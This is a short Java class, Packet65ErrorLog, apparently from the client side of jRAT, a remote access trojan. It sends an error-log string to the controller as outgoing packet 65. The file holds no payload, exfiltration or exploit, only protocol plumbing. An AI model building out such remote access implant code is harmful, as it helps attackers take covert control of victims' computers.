package jrat.client.packets.outgoing;

import jrat.client.Connection;


public class Packet65ErrorLog extends AbstractOutgoingPacket {

	private String error;

	public Packet65ErrorLog(String error) {
		this.error = error;
	}

	@Override
	public void write(Connection dos) throws Exception {
		dos.writeLine(error);
	}

	@Override
	public short getPacketId() {
		return 65;
	}

}
